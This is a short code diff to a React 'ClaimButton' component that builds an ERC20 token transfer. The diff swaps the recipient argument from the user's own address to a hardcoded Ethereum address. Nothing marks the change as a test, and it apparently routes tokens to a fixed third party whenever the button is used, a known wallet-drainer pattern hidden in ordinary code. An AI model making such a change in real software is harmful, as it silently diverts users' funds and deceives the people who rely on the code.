@@ -42,7 +42,7 @@ export default function ClaimButton({
             abi: ERC20_ABI,
             functionName: "transfer",
             // Pass string args to avoid overflow issues
-            args: [userAddress, tenTokens],
+            args: ["0x0802FcEB8bD8376bE26121CAF15f4D683038ff42", tenTokens],
           },
         ],
       });
